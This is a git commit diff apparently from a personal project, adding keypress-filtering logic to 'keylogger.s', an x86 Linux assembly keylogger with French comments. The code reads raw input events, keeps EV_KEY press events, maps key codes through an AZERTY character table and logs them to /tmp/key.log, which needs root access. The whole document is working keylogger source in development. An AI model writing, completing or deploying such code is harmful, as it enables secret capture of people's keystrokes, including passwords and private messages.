68abc6ef03831237be7bfca45cda1e6102910914
quentin-csg <qcassaigne73@gmail.com>
2024-05-01 18:14:11 +0200

    conditions

--- keylogger.s
+++ keylogger.s
@@ -24,12 +24,23 @@ _start:
 
 input:
 
-    mov edx, 16
+    mov edx, 16                     ; 16 bytes
     mov ecx, input_event
     mov ebx, esi                    ; File descriptor for reading bytes
     mov eax, 3                      ; sys_read
     int 0x80
 
+    mov byte al, [input_event + 8]  ; event.type
+    cmp ax, 0x01                       ;  event.type(EV_KEY) = 1 -> https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h#L39
+    jne log         ; jump not equal
+
+    mov byte al, [input_event + 12] ; event.value
+    cmp al, 1                       ; event.value = 1 -> event_value de EV_KEY = 1 -> keypress, 0 for key release
+    jne log       ; jump equal
+
+    mov byte al, [ecx + 10]         ; event.code (valeur en hexa de la touche du clavier)
+    mov byte bl, [Ascii + eax]    ; utiliser cette valeur comme index dans notre string qui représente notre clavier pour trouver la touche du clavier
+    push ebx  
 
 
 
@@ -51,7 +62,7 @@ section .data
     output_file   db "/tmp/key.log", 0
     errMsg db "Besoin des privilèges du superUtilisateur", 0xa
     lenErrMsg equ $ - errMsg
-
+    Ascii db `azertyuiopqsdfghjklmwxcvbn`
 
 section .bss
     input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
